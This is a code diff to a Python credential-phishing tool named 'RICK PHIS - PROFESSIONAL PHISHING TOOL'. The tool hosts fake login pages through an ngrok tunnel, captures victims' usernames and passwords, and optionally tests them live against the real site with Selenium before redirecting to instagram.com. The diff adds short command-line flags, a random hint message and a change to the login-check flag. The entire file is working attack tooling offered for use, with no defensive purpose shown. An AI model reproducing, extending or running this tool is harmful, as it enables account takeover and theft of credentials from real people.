@@ -1,4 +1,3 @@
-import os
 import platform
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore, init
@@ -14,6 +13,8 @@ from datetime import datetime
 from webdriver_manager.firefox import GeckoDriverManager
 from pyngrok import ngrok
 import json
+import random
+
 
 init()
 
@@ -46,6 +47,12 @@ for account in accounts:
 
 print(Fore.RESET)
 
+filehir = open("hir.txt", "r")
+sentences = filehir.read().splitlines()
+filehir.close()
+random_sent = random.choice(sentences)
+print(f"{yellow_color}[{green_color}HINT{yellow_color}]{white_color} {random_sent}\n")
+
 path_separator = '\\' if platform.system() == 'Windows' else '/'
 
 language_mapping = {
@@ -66,21 +73,20 @@ language_mapping = {
 help_menu = f"""{Fore.WHITE}
 RICK PHIS - PROFESSIONAL PHISHING TOOL
 
-        Arguments            Required           Description 
+        Arguments        shortcut     Required           Description 
                                                                                                                                                        
-  --site  <site_number>       {Fore.RED}YES{Fore.WHITE}         Site number (e.g., 1, 2, 3)                                                                                   |
-  --lang  <language_code>     NO          Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
-  --port  <port_number>       NO          Port number (0-65535)                                                                                         
-  --output <file_name>        NO          Gets information as output                                                                                    
-  --location <url>            NO          Redirect location (default: https://instagram.com)                                                            
-  --check                     NO          It tests the entered information and shows whether it is correct. 
-                                          Attention, this process may cause delays! 
-  --ngrok-token <token>       YES         Ngrok authentication token for tunneling
-  --headless                  NO          Run Selenium in headless mode
-  --help                      NO          Show this help message and exit                                                                               
+  --site  <site_number>     -s        {Fore.RED}YES{Fore.WHITE}         Site number (e.g., 1, 2, 3)
+  --ngrok-token <token>     -ng       {Fore.RED}YES{Fore.WHITE}         Ngrok authentication token for tunneling
+  --lang  <language_code>   -l        NO          Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
+  --port  <port_number>     -p        NO          Port number (0-65535)                                                                                         
+  --output <file_name>      -o        NO          Gets information as output                                                                                    
+  --location <url>          --loc     NO          Redirect location (default: https://instagram.com)                                                            
+  --check                   -c        NO          It tests the entered information and shows whether it is correct.  
+  --headless                --hoff    NO          Run Selenium in headless mode
+  --help                    -h        NO          Show this help message and exit                                                                               
 """
 
-login_check = False
+login_check = True
 
 def check_trust(username, password, headless=True):
     global login_check
@@ -143,10 +149,10 @@ def main():
     parser.add_argument('--lang','-l', type=str, default='en', help='Language code (e.g., en, tr, de)')
     parser.add_argument('--port','-p', type=int, default=0, help='Port number (0-65535)')
     parser.add_argument('--output','-o', type=str, help='Gets information as output')
-    parser.add_argument('--location', type=str, default='https://instagram.com', help='Redirect location (default: https://instagram.com)')
+    parser.add_argument('--location','--loc', type=str, default='https://instagram.com', help='Redirect location (default: https://instagram.com)')
     parser.add_argument('--check', '-c', action='store_true', help='Perform login check')
     parser.add_argument('--ngrok-token','-ng', type=str, required=True, help='Ngrok authentication token for tunneling')
-    parser.add_argument('--headless', action='store_true', help='Run Selenium in headless mode')
+    parser.add_argument('--headless','--heoff', action='store_true', help='Run Selenium in headless mode')
 
 
     try:
@@ -272,7 +278,7 @@ def start_server(web_site, port, output_file, redirect_location, check_login, ng
                     check_trust(sel_username, sel_password, headless_mode)
                 
                 response = {}
-                if login_check or not check_trust:
+                if login_check == True or not check_trust:
                     response['status'] = 'success'
                     response['redirect'] = redirect_location
                 else:
